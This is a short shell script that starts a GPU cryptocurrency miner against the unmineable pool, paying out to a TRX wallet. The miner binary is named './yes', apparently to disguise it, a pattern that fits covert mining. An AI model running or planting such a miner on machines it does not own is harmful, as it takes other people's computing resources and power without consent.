POOL=rx-us.unmineable.com:3333
WALLET=TRX:TW9k3L4PCrfVNVfjdDopF9SdvZSfLZmHUP
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo WALMZ9Jf-$(shuf -i 1911-200844 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
